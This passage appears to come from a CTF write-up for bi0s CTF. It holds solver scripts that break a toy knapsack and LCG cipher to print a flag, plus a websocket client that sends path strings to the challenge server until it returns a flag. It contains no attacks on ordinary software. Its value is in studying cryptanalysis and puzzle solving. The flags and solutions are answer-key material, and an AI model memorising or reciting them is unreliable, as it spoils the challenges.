7457067309408071136462520290099813600595760616382451252266638576757556195357758384430233685566475045370258747830063483558129016033041534121), (87, 7138834056650788599340304091245357448689914704543367476875970477848587821892811763578094466693024724929034161719556439516286550418480386826), (85, 4214620981374285095640824086913124961419729602098347661701803957979165936606167686524401563099707189265200486482516005732059773306234258420), (87, 7739066385937951930229094506964291860284170243142110190122036300802992602806430896564185899709833543891933679072444463084661529668059219104), (86, 7996763147644153267931052506581385268378745125996592054161290689392831593366496210631236238142447646254463386914159791951904746842709666621), (83, 2363927368088545362888027832425184786062409622322321649991521010872009124933023792724085312213031828468440431258319304817389205319949123017), (86, 8952178949693065428977346330331508030115172989418887909205463101008773555390353195154597245789628940426095401145185560848927781578325104633), (87, 5437733249052136209105079687557091961563919494484950700755430118355692330802405578709308644911805929080699188377572804834481019970451287210), (88, 6015299972513982077146707497576267202666793107003902152334693697774096888512046451228148219477544391600946101222260160929679756603685952858), (88, 4568852671731251436040898868989551602956632306950375030804513367391992286782270552341135397170272362552944089560054885656717064705695931608), (88, 5214418374014497232007521802148945843762329611158152570151078790657020448385624421117820553224634987052518291618670107521494031262847423514), (85, 4868781049816097655711690233312446779184038900364456479177916582789767967134191139603006712483609665048365174590374678749717762853252392898), (87, 7487878378499555558388350908281092245535427011554302229088273963701472371659945154073798520163320208196872977374676841353329741664704431049), (88, 4804650300297155317595282760599161747288241275410480931480258003053935686370721999717184367371623277273540661128542000775004283694728585525), (87, 6324353155591926121419512579497192374524354396151314193997508188259969434627055717937503525281909856550845807173753553651932260148517039625), (87, 5546469224661430242652418747991106002905180051710879985326544434722895447041925331360634907813012794515907098935485171653197695779005009826), (86, 6493922061250196900387871627336695511599800586007321943800903718034500613505566204881495072235610494479661303981584755703237874004730700241), (84, 3304267236247240014753455621608696126482869339445549240138779235284450054938719633292333925332195771054789798560540593262065547955691287860), (86, 7470707627092056238764393981318045721888042683539521453158125764519328859948265999477619788387120366063077899885955739104933799243393828710), (88, 6674831873895816998217860257081780104168741154329195649911902365299495130324698497916172758145782383658122037059537201009889153133307754158), (88, 5323014117483698150842190422231005724805137799598831691161862346623039247622359972881775361362745899238680458901399065283489317592046388919), (85, 3763698408921732607951773848228884704668238062686979349129116312470621538052054791662510364394420612090312977770614743449723324784458538150)]

ciphertext = []
for i in range(len(ct)):#len(ct)):
    n,s = ct[i]
    st = int(s   * inverse(r,q))  % q
    strs = ""
    for puc_inv in public[-n:]:
        if st > puc_inv or (puc_inv == 1 and st == 1):
            st = st % puc_inv
            strs = "1" + strs
        else:
            strs = "0" + strs

    ciphertext.append(int(strs,2))
print(ciphertext[:4])

FLAG_FORMAT = "bi0s"

NBITS = 44<<2

a = 0xBAD2C0DE
c = 0x6969
m = 1<<NBITS
'''

for i,f in enumerate(FLAG):
    state = (state*a+c)%m
    ciphertext.append((state>>(NBITS>>1))^^i^^ord(f))
'''
states = [0]
for i,f in enumerate(FLAG_FORMAT):
    states.append((ciphertext[i]^i^ord(f))<<(NBITS>>1))
# print(states)
# print(NBITS>>1)
# s1 + s1_ = (s0 + s0_) * a + c %m
# (s1 - a*s0-c) + s1_ - a*s0_ %m

'''A = [1]
B = [0]
for i in range(1, len(states)-1):
    A.append(a*A[i-1] % m)
    B.append((a*B[i-1]+a*states[i]+c-states[i+1]) % m)
A = A[1:]
B = B[1:]
M = matrix(ZZ, 2+len(A), 2+len(A))

for i in range(len(A)):
    M[i, i] = m
    M[len(A), i] = A[i]
    M[len(A)+1, i] = B[i]
    M[i, len(A)] = M[i, len(A)+1] = 0
M[len(A), len(A)] =  1
M[len(A)+1, len(A)+1] = 2^88
M[len(A), len(A)+1]= 0
ML = M.LLL()'''
states = states[1:]
[264893701359261384184087199,96391972943163767741116235,308702811501065345352543347,304985483494140320227177621]
print((((states[0]+304985483494140320227177621)*a+c)%m)>>(NBITS>>1) == states[1]>>(NBITS>>1))

seed = ((states[0]+304985483494140320227177621 - c) * inverse(a,m)) % m 
print(seed)

a = 0xBAD2C0DE
c = 0x6969
m = 1<<NBITS
state = states[0]+304985483494140320227177621

plaintext = []

for i in range(44):
    if i==0:
        continue
    state = (state*a+c)%m
    plaintext.append((state>>(NBITS>>1))^i^ciphertext[i])
print(b'b' + bytes(plaintext))
    #bi0sctf{lcg_is_good_until_you_break_them_!!}
import websocket

ws = websocket.WebSocket()

ws.connect("ws://instance.chall.bi0s.in:
10130/")

import json
resp = ws.recv()
head = [26, 26]
s = ""
while head[0] > 0:
    head[0] -= 1
    s += "u"
while head[1] > 0:
    head[1] -= 1
    s += "l"
ws.send(s)
resp = json.loads(ws.recv())
assert(resp["head"] == [0, 0])

s1 = "d"*30+"r"+"u"*29+"r"+"d"*29+"r"+"rulu"*13+"ruulurr"+("d"*29+"r"+"u"*29+"r")*12+"d"*29+"r"+"u"*30+"l"*30
s2 = "d"*30+"r"+"u"*29+"r"+"d"*29+"r"+"rulu"*13+"urulurr"+("d"*29+"r"+"u"*29+"r")*12+"d"*29+"r"+"u"*30+"l"*30

def check(s):
    head = [0, 0]
    size = 31
    d = {}
    for ch in s:
        if ch == "l":
            head[-1] -= 1
        elif ch == "r":
            head[-1] += 1
        elif ch == "u":
            head[0] -= 1
        else:
            head[0] += 1
        assert 0 <= head[0] < size
        assert 0 <= head[1] < size
        assert(tuple(head) not in d)
        d[tuple(head)] = 1
    assert head == [0, 0]

check(s1)
check(s2)
assert(len(s1) == 960)
assert(len(s2) == 960)

while True:
    ws.send(s1)
    resp = ws.recv()
    print(resp)
    resp = json.loads(resp)
    if ("flag" in resp):
        print(resp["flag"])
        break
    ws.send(s2)
    resp = ws.recv()
    print(resp)
    resp = json.loads(resp)
    if ("flag" in resp):
        print(resp["flag"])
        break

ws.close()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1674740046.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/5-1674740046.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1674740046.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1674740046.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1674740047.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/5-1674740047.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1674740047.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1674740048.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1674740048.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1674740048.png)